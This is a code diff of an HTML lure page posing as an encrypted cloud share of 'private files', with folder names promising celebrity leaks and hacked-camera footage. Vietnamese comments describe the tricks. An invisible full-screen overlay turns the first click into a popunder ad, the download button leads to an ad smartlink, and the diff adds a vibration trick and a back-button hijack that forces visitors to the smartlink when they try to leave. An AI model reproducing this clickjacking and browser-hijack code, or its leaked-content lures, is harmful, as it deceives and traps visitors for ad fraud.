@@ -13,7 +13,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background-color: #0b1120; color: #94a3b8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; }
         
-        /* LỚP BẪY TÀNG HÌNH ĐỂ KÍCH NỔ POPUNDER LẦN ĐẦU */
+        /* LỚP BẪY TÀNG HÌNH FULL MÀN HÌNH */
         #trap {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 99999; cursor: pointer; background: rgba(0,0,0,0);
@@ -29,7 +29,6 @@
         .info b { display: block; color: #f1f5f9; font-size: 14px; margin-bottom: 5px; text-transform: uppercase; }
         .info span { font-size: 11px; color: #64748b; }
 
-        /* NÚT DOWNLOAD GẮN SMARTLINK */
         .btn-download { 
             display: block; text-decoration: none; background: #2563eb; color: #ffffff; 
             text-align: center; padding: 18px; border-radius: 10px; font-weight: bold; 
@@ -54,31 +53,48 @@
 
     <div class="folder-card">
         <div class="icon">📁</div>
-        <div class="info"><b>M1LF</b><span>85 Files • 890 MB</span></div>
+        <div class="info"><b>B.O.L.L.Y.W.O.O.D_A.C.T.R.E.S.S_L.E.A.K.S</b><span>85 Files • 890 MB</span></div>
     </div>
 
     <div class="folder-card">
         <div class="icon">📁</div>
-        <div class="info"><b>H4CK CAMERA</b><span>210 Files • 2.1 GB</span></div>
+        <div class="info"><b>W.H.A.T.S.A.P.P_V.I.R.A.L_G.R.O.U.P_L.I.N.K.S</b><span>210 Files • 2.1 GB</span></div>
     </div>
 
     <div class="folder-card">
         <div class="icon">📁</div>
-        <div class="info"><b>J.A.V</b><span>56 Files • 4.2 GB</span></div>
-    
+        <div class="info"><b>H4CK CAMERA</b><span>56 Files • 4.2 GB</span></div>
+    </div>
 
     <a href="https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566" class="btn-download">DOWNLOAD ALL PRIVATE FILES</a>
 
     <div class="footer-text">
-        Secure Cloud Encryption © 2026. <br> IP Registered in Brazil.
+        Secure Cloud Encryption © 2026. <br> High-Speed Mumbai Server.
     </div>
 
     <script>
-        // Khi khách click bất kỳ đâu lần đầu: Popunder nổ, Social Bar hiện, và bẫy ẩn đi
+        // 1. CLICK LẦN ĐẦU: NỔ POPUNDER + TẮT BẪY
         document.getElementById('trap').addEventListener('click', function() {
             this.style.display = 'none'; 
-            console.log("Ads Triggered!");
+            console.log("Popunder Triggered!");
         });
+
+        // 2. TRICK RUNG MÁY (ANDROID)
+        window.addEventListener('load', function() {
+            if ("vibrate" in navigator) {
+                navigator.vibrate([100, 50, 100]);
+            }
+        });
+
+        // 3. TRICK BACK BUTTON HIJACK (BẤM BACK LÀ ĂN SMARTLINK)
+        (function() {
+            var smartlink = "https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";
+            history.pushState(null, document.title, location.href);
+            window.addEventListener('popstate', function (event) {
+                // Ép quay lại trang smartlink thay vì thoát
+                window.location.assign(smartlink);
+            });
+        })();
     </script>
 
 </body>
